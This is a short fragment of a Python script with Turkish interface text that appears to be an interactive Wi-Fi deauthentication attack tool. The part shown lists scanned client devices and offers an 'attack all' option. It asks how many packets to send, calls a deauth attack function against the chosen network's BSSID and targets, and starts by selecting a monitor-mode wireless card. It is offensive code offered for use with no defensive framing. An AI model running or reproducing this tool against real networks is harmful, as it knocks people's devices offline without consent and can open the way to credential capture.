        print(Fore.RED + "[!] Cihaz bulunamadı. Menüye dönülüyor..." + Style.RESET_ALL)
        time.sleep(2)
        return

    print(Fore.CYAN + "\n--- Taranan Cihazlar ---" + Style.RESET_ALL)
    for i, cihaz in enumerate(cihazlar, 1):
        print(Fore.WHITE + f"{i}. {cihaz}" + Style.RESET_ALL)
    print(Fore.WHITE + "0. Hepsine saldır" + Style.RESET_ALL)

    cihaz_sec = input_int(Fore.BLUE + "Hedef cihaz numarası (0 hepsi): " + Style.RESET_ALL, 0, len(cihazlar))
    hedefler = cihazlar if cihaz_sec == 0 else [cihazlar[cihaz_sec - 1]]

    paket = input_int(Fore.BLUE + "Kaç paket gönderilsin?: " + Style.RESET_ALL, 1)

    deauth_saldir(secilen_ag['bssid'], hedefler, paket, monitor_mod_karti)

if __name__ == "__main__":
    check_dependencies()
    monitor_mod_karti = wifi_kartlarini_bul_ve_sec()
    ana_menu()
